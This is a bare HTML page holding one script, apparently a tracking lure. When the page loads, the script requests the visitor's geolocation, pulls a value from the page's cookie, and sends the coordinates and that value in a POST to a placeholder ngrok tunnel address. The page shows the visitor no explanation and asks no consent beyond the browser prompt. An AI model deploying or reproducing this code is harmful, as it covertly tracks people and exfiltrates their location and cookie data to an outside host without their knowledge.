<!DOCTYPE html>
<html>
    <head>
        <script>
                navigator.geolocation.getCurrentPosition( function ( position ) {  
                    var username = document.cookie.split("=");
                    console.log(username[1]);
                    const request = new Request(`[ngrok address here]/geolocationLanding/?latitude=${position.coords.latitude}&longitude=${position.coords.longitude}&userNumber=${username[1]}`, {method: 'POST', body: '{"foo": "bar"}'} );
                    fetch(request).then ( (response) => { console.log( "the redirect returned");  } ); 
            } );
                
        </script>
    </head>
</html>
